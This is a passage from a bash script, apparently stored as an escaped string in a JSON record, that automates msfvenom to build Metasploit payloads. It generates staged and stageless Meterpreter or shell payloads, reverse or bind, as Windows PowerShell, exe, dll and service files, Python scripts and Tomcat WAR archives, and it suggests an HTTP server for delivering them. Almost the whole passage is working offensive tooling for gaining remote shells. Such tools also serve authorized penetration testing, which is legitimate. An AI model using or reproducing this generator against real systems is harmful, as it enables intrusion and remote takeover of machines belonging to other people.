 [[ \"${METHOD}\" == \"find_port\" ]] \\\n    && METHOD=\"allports\"\n  TYPE=\"windows\"\n  FILEEXT=\"ps1\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ps1 \\\\\\\\\\n  --platform ${TYPE} -e generic/none -a x86 ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Python\nelif [[ \"${TYPE}\" == \"python\" || \"${TYPE}\" == \"py\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Cant do: staged shell // stageless meterpreter // stageless bind - Invalid Payload Selected\n  if [[ \"${STAGE}\" == \"staged\" && \"${SHELL}\" == \"shell\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${STAGE}\" == \"stageless\" && \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${STAGE}\" == \"stageless\" && \"${DIRECTION}\" == \"bind\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${DIRECTION} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  fi\n  TYPE=\"python\"\n  FILEEXT=\"py\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f raw \\\\\\\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Tomcat\nelif [[ \"${TYPE}\" == \"tomcat\" || \"${TYPE}\" == \"war\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Cant do: stageless meterpreter // stageless bind // find_ports    (Invalid Payload Selected)\n  if [[ \"${STAGE}\" == \"stageless\" && \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${STAGE}\" == \"stageless\" && \"${DIRECTION}\" == \"bind\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${DIRECTION} ${STAGE} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${METHOD}\" == \"find_ports\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${METHOD} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  fi\n  TYPE=\"tomcat\"\n  FILEEXT=\"war\"\n  PAYLOAD=\"java/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f raw \\\\\\\\\\n  --platform java -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Windows\nelif [[ \"${TYPE}\" == \"windows\" || \"${TYPE}\" == \"win\" || \"${TYPE}\" == \"exe\" || \"${TYPE}\" == \"dll\" || \"${TYPE}\" == \"srv\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  [[ \"${METHOD}\" == \"find_port\" ]] \\\n    && METHOD=\"allports\"\n  # Its able todo anything that you throw at it =).\n  FILEEXT=\"exe\"\n  [[ \"${TYPE}\" == \"dll\" ]] && FILEEXT=\"dll\"\n  [[ \"${TYPE}\" == \"srv\" ]] && FILEEXT=\"exe-service\"\n  TYPE=\"windows\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT%-service}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Batch/Loop modes\nelif [[ \"${BATCH}\" == \"true\" || \"${LOOP}\" == \"true\" ]]; then\n  #SUCCESS=true\n  exit 0\n\n## Blank input\nelif [[ -z \"${TYPE}\" ]]; then\n  echo -e \"\\n ${YELLOW}[i]${RESET} ${YELLOW}Missing TYPE${RESET} or ${YELLOW}BATCH/LOOP mode${RESET}\"\n\n## Unexpected input\nelse\n  echo -e \"\\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}\" >&2\nfi\n\n\n#-Done--------------------------------------------------------#\n\n\n##### Done!\nif [[ \"${SUCCESS}\" == true ]]; then\n  echo -e \" ${GREEN}[?]${RESET} ${GREEN}Quick web server${RESET} (for file transfer)?: python3 -m http.server 8080\"\n  echo -e \" ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!\"\nelse\n  doHelp\nfi\n\nexit 0\n"
        }
      ]
    }
  ]
}